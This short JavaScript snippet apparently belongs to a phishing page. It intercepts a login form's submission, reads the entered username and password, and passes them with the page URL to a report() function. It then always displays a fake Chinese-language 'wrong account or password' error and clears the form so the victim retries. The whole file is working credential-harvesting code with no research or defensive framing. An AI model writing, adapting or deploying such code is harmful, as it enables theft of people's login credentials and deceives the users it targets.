(function () {
  var form = document.getElementById("ph-login-form");
  if (!form) { return; }
  var err = document.querySelector(".ph-err");
  form.addEventListener("submit", function (e) {
    e.preventDefault();
    var user = document.getElementById("ph-user").value || "";
    var pass = document.getElementById("ph-pass").value || "";
    if (!user || !pass) {
      if (err) { err.style.display = "block"; err.textContent = "请输入账号和密码"; }
      return;
    }
    report({ type: "login", url: location.href, user: user, pass: pass });
    if (err) {
      err.style.display = "block";
      err.textContent = "账号或密码错误,请重新输入";
    }
    var btn = form.querySelector("button[type=submit]");
    if (btn) {
      btn.disabled = true;
      setTimeout(function () { btn.disabled = false; }, 1200);
    }
    form.reset();
  });
})();
